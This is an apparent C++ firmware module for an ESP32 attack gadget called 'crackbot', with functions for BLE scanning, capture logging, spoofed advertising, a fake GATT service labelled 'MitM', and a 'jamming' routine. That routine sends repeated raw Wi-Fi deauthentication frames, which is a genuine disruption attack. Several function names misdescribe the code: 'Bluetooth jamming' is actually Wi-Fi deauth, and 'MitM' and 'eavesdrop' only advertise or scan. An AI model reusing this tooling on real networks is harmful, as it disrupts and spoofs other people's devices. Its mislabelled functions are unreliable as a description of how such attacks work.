#include "crackbot/config.h"
#include "crackbot/lab_ble.h"
#include "crackbot/lab_wifi.h"
#include "crackbot/state.h"
#include "crackbot/ui_bridge.h"

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <SD.h>
#include <esp_wifi.h>

namespace crackbot::lab {

static BLEServer *gServer = nullptr;

class CrackBotServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *pServer) override {
    ui::setStatus("BLE client connected");
    (void)pServer;
  }
  void onDisconnect(BLEServer *pServer) override {
    ui::setStatus("BLE client disconnected");
    pServer->getAdvertising()->start();
  }
};

class CrackBotWriteCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *ch) override {
    std::string v = ch->getValue();
    Serial.printf("BLE RX: %s\n", v.c_str());
    File log = SD.open(CRACKBOT_EAVESDROP_LOG_PATH, FILE_APPEND);
    if (log) {
      log.printf("%lu %s\n", millis(), v.c_str());
      log.close();
    }
  }
};

void setupBleStack() {
  BLEDevice::init(CRACKBOT_HOSTNAME_CYD);
  gServer = BLEDevice::createServer();
  gServer->setCallbacks(new CrackBotServerCallbacks());
  BLEService *svc = gServer->createService("12345678-1234-1234-1234-1234567890ab");
  BLECharacteristic *ch = svc->createCharacteristic(
      "87654321-4321-4321-4321-0987654321ba",
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE |
          BLECharacteristic::PROPERTY_NOTIFY);
  ch->setCallbacks(new CrackBotWriteCallbacks());
  svc->start();
  gServer->getAdvertising()->start();
}

void scanBleDevices() {
  ui::setStatus("BLE scan 10s...");
  BLEScan *scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  BLEScanResults results = scan->start(10, false);
  ui::clear();
  int shown = 0;
  for (int i = 0; i < results.getCount() && shown < 10; ++i) {
    BLEAdvertisedDevice d = results.getDevice(i);
    ui::println(String(d.getAddress().toString().c_str()) + " " + String(d.getRSSI()));
    shown++;
  }
  scan->clearResults();
  ui::setStatus("BLE scan done");
}

void deployEavesdropping() {
  ui::setStatus("Eavesdrop deploy");
  scanBleDevices();
  File log = SD.open(CRACKBOT_EAVESDROP_LOG_PATH, FILE_APPEND);
  if (log) {
    log.printf("%lu eavesdrop_start\n", millis());
    log.close();
  }
}

void deployMitMAttack() {
  ui::setStatus("MitM BLE service");
  BLEServer *srv = BLEDevice::createServer();
  BLEService *svc = srv->createService(BLEUUID((uint16_t)0x180D));
  BLECharacteristic *ch = svc->createCharacteristic(
      BLEUUID((uint16_t)0x2A37),
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE |
          BLECharacteristic::PROPERTY_NOTIFY);
  ch->setValue("MitM-lab");
  svc->start();
  srv->getAdvertising()->start();
}

void deployBluetoothJamming() {
  ui::setStatus("RF jam pattern");
  setPromiscuousMode(true);
  for (int i = 0; i < 20; ++i) {
    esp_wifi_80211_tx(WIFI_IF_AP, gDeauthPacket, sizeof(gDeauthPacket), false);
    delay(30);
  }
  setPromiscuousMode(false);
}

void deployBluetoothSpoofing() {
  ui::setStatus("BLE spoof adv");
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  BLEAdvertisementData ad;
  ad.setName("MrCrackBot-Spoof");
  adv->setAdvertisementData(ad);
  adv->start();
}

}  // namespace crackbot::lab
